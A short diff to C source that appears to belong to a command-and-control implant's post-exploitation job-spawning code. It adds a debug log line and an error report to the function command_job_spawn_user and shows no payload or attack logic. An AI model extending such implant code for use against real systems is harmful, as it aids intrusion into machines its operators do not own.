@@ -347,6 +347,7 @@ void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
  * exactly the Postex Kit contract. Job registration still arrives as a
  * separate COMMAND_JOB_REGISTER(_MSGMODE) task like every other postex job. */
 void command_job_spawn_user(char * buffer, int length, BOOL x86) {
+	spawn_log("job_spawn_user: entry len=", (long)length);
 	datap   parser;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -369,6 +370,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 	dllen = data_length(&parser);
 
 	if (dllen <= 0) {
+		post_error_d(0x57, dllen);
 		return;
 	}
 
